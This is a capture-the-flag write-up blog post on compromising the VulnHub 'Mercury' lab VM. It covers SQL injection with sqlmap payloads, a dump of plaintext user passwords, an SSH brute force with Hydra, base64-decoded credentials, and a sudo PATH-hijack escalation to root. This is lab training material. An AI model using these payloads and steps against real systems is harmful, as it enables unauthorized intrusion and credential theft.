---
layout: post
title: Smallest Planet
date: 20-04-2025
categories: [Basics]
tags: [blind, commandinjection, wget]
image: "https://static.independent.co.uk/s3fs-public/thumbnails/image/2009/12/29/01/284622.jpg"
---

> I Think i have to turn Off the Sun it's so Hot, in My rocket i have no more oxygen tanks Oops!.
{: .prompt-danger }

image: https://static.independent.co.uk/s3fs-public/thumbnails/image/2015/07/01/23/web-aliens-2.jpg

## scanning
```

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-05 23:23 EAT
Nmap scan report for 192.168.56.117
Host is up (0.000076s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)
|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)
|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)
8080/tcp open  http    WSGIServer 0.2 (Python 3.8.2)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: WSGIServer/0.2 CPython/3.8.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 08:00:27:C6:05:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.68 seconds

```

nmap proxy webpage on port 8080 with robots.txt disallow /

try retreave all by adding * after then
![[mercury_1.jpg]]

http://192.168.56.117:8080/*
wow! reveal one of the damn sheet


- something i can navigate

```
view-source:http://192.168.56.117:8080/mercuryfacts/1/
>>>> this link give me shock to have present of the sql injection vuln

http://192.168.56.117:8080/mercuryfacts/todo
```
![Screenshot From 2025-04-06 00-18-26](https://github.com/user-attachments/assets/7ea39e09-9e8e-4eb2-ad9e-277d0097c3ea)



## Damn killing the DBS

``http://192.168.56.117:8080/mercuryfacts/1'%20--/ ``





```
                                                                    
┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/mecury]
└─$ sqlmap -u http://192.168.56.117:8080/mercuryfacts/1 --dbs 
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:42:09 /2025-04-05/

[23:42:09] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] y
[23:42:17] [INFO] testing connection to the target URL
got a 301 redirect to 'http://192.168.56.117:8080/mercuryfacts/1/'. Do you want to follow? [Y/n] y
[23:42:19] [INFO] testing if the target URL content is stable
[23:42:19] [WARNING] URI parameter '#1*' does not appear to be dynamic
[23:42:20] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[23:42:21] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[23:42:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:42:27] [WARNING] reflective value(s) found and filtering out
[23:42:28] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[23:42:28] [INFO] testing 'Generic inline queries'
[23:42:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[23:42:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[23:42:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[23:42:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[23:42:28] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[23:42:28] [INFO] URI parameter '#1*' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[23:42:28] [INFO] testing 'MySQL inline queries'
[23:42:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[23:42:28] [WARNING] time-based comparison requires larger statistical model, please wait................ (done)

[23:42:39] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[23:42:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:42:49] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[23:42:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[23:42:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[23:42:49] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[23:42:50] [INFO] target URL appears to have 1 column in query
[23:42:50] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://192.168.56.117:8080/mercuryfacts/1 AND 1950=1950

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: http://192.168.56.117:8080/mercuryfacts/1 AND GTID_SUBSET(CONCAT(0x71716b7671,(SELECT (ELT(1364=1364,1))),0x716b6a7871),1364)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: http://192.168.56.117:8080/mercuryfacts/1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://192.168.56.117:8080/mercuryfacts/1 AND (SELECT 1454 FROM (SELECT(SLEEP(5)))RGzx)

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://192.168.56.117:8080/mercuryfacts/1 UNION ALL SELECT CONCAT(0x71716b7671,0x5a765770666d6662636843546e6d6c4c444c67466b45676f7355567a5543475573547a4b5279635a,0x716b6a7871)-- -
---
[23:42:50] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[23:42:50] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] mercury

[23:42:50] [INFO] fetched data logged to text files under '/home/cyberkid/.local/share/sqlmap/output/192.168.56.117'

[*] ending @ 23:42:50 /2025-04-05/

                                                                                   
┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/mecury]
└─$ 


```


## Dumping the mecury database.

```
                                                                                                                                 
┌──(cyberkid㉿kali)-[~]
└─$ sqlmap -u "http://192.168.56.117:8080/mercuryfacts/1" --dbs -D mercury --tables --dump

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:54:02 /2025-04-05/

[23:54:03] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] y
[23:54:04] [INFO] resuming back-end DBMS 'mysql' 
[23:54:04] [INFO] testing connection to the target URL
got a 301 redirect to 'http://192.168.56.117:8080/mercuryfacts/1/'. Do you want to follow? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://192.168.56.117:8080/mercuryfacts/1 AND 1950=1950

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: http://192.168.56.117:8080/mercuryfacts/1 AND GTID_SUBSET(CONCAT(0x71716b7671,(SELECT (ELT(1364=1364,1))),0x716b6a7871),1364)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: http://192.168.56.117:8080/mercuryfacts/1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://192.168.56.117:8080/mercuryfacts/1 AND (SELECT 1454 FROM (SELECT(SLEEP(5)))RGzx)

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://192.168.56.117:8080/mercuryfacts/1 UNION ALL SELECT CONCAT(0x71716b7671,0x5a765770666d6662636843546e6d6c4c444c67466b45676f7355567a5543475573547a4b5279635a,0x716b6a7871)-- -
---
[23:54:06] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[23:54:06] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] mercury

[23:54:06] [INFO] fetching tables for database: 'mercury'
[23:54:06] [WARNING] reflective value(s) found and filtering out
Database: mercury
[2 tables]
+-------+
| facts |
| users |
+-------+

[23:54:06] [INFO] fetching columns for table 'facts' in database 'mercury'
[23:54:06] [INFO] fetching entries for table 'facts' in database 'mercury'
Database: mercury
Table: facts
[8 entries]
+----+--------------------------------------------------------------+
| id | fact                                                         |
+----+--------------------------------------------------------------+
| 1  | Mercury does not have any moons or rings.                    |
| 2  | Mercury is the smallest planet.                              |
| 3  | Mercury is the closest planet to the Sun.                    |
| 4  | Your weight on Mercury would be 38% of your weight on Earth. |
| 5  | A day on the surface of Mercury lasts 176 Earth days.        |
| 6  | A year on Mercury takes 88 Earth days.                       |
| 7  | It's not known who discovered Mercury.                       |
| 8  | A year on Mercury is just 88 days long.                      |
+----+--------------------------------------------------------------+

[23:54:06] [INFO] table 'mercury.facts' dumped to CSV file '/home/cyberkid/.local/share/sqlmap/output/192.168.56.117/dump/mercury/facts.csv'
[23:54:06] [INFO] fetching columns for table 'users' in database 'mercury'
[23:54:06] [INFO] fetching entries for table 'users' in database 'mercury'
Database: mercury
Table: users
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+

[23:54:06] [INFO] table 'mercury.users' dumped to CSV file '/home/cyberkid/.local/share/sqlmap/output/192.168.56.117/dump/mercury/users.csv'
[23:54:06] [INFO] fetched data logged to text files under '/home/cyberkid/.local/share/sqlmap/output/192.168.56.117'

[*] ending @ 23:54:06 /2025-04-05/

                                                                                                                                                                        
```
# SSH brute to the crdential get from the database for the spray of the data

```
┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/mecury]
└─$ hydra -L users.txt -P pass.txt ssh://192.168.56.117
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-05 23:58:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking ssh://192.168.56.117:22/
[22][ssh] host: 192.168.56.117   login: webmaster   password: mercuryisthesizeof0.056Earths
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-05 23:58:14
```
## Home users
```
drwx------  3 linuxmaster linuxmaster 4096 Sep  2  2020 linuxmaster
drwx------  3 mercury     mercury     4096 Sep  1  2020 mercury
drwx------  4 webmaster   webmaster   4096 Sep  2  2020 webmaster
```
## Enum
```
webmaster@mercury:~$ ls
mercury_proj  user_flag.txt
webmaster@mercury:~$ cd mercury_proj/
webmaster@mercury:~/mercury_proj$ ls
db.sqlite3  manage.py  mercury_facts  mercury_index  mercury_proj  notes.txt
webmaster@mercury:~/mercury_proj$ cat notes.txt 
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK

linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/mecury]
└─$ echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" |base64 -d            
mercurymeandiameteris4880km
                                                                                   
```
## Lateral movement
```
┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/mecury]
└─$ ssh linuxmaster@192.168.56.117
linuxmaster@192.168.56.117's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat  5 Apr 21:09:07 UTC 2025

  System load:  0.07              Processes:               111
  Usage of /:   67.2% of 4.86GB   Users logged in:         1
  Memory usage: 31%               IPv4 address for enp0s3: 192.168.56.117
  Swap usage:   0%


22 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Aug 28 12:57:20 2020 from 192.168.31.136
linuxmaster@mercury:~$ whoami
linuxmaster
linuxmaster@mercury:~$ 
```
## Privilage esc
```
linuxmaster@mercury:~$ sudo -l
[sudo] password for linuxmaster: 

Sorry, try again.
[sudo] password for linuxmaster: 
Sorry, try again.
[sudo] password for linuxmaster: 
]Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
linuxmaster@mercury:~$ ]
```
## Allien inversion
```
linuxmaster@mercury:/usr/bin$ sudo ./check_syslog.sh 
Apr  5 21:09:07 mercury systemd[2103]: Listening on debconf communication socket.
Apr  5 21:09:07 mercury systemd[2103]: Listening on D-Bus User Message Bus Socket.
Apr  5 21:09:07 mercury systemd[2103]: Reached target Sockets.
Apr  5 21:09:07 mercury systemd[2103]: Reached target Basic System.
Apr  5 21:09:07 mercury systemd[1]: Started User Manager for UID 1002.
Apr  5 21:09:07 mercury systemd[1]: Started Session 5 of user linuxmaster.
Apr  5 21:09:07 mercury systemd[2103]: Reached target Main User Target.
Apr  5 21:09:07 mercury systemd[2103]: Startup finished in 132ms.
Apr  5 21:09:30 mercury systemd-timesyncd[472]: Network configuration changed, trying to establish connection.
Apr  5 21:09:30 mercury systemd-networkd[345]: enp0s3: DHCP: No gateway received from DHCP server.
linuxmaster@mercury:/usr/bin$ echo -e '#!/bin/bash\n/bin/bash' > /tmp/tail
linuxmaster@mercury:/usr/bin$ chmod +x /tmp/tail
linuxmaster@mercury:/usr/bin$ sudo PATH=/tmp:$PATH /usr/bin/check_syslog.sh
root@mercury:/usr/bin# 
root@mercury:/usr/bin# 
```
![Screenshot From 2025-04-06 00-15-28](https://github.com/user-attachments/assets/f6031123-ad81-4fe0-8d53-48a9bb6b734c)


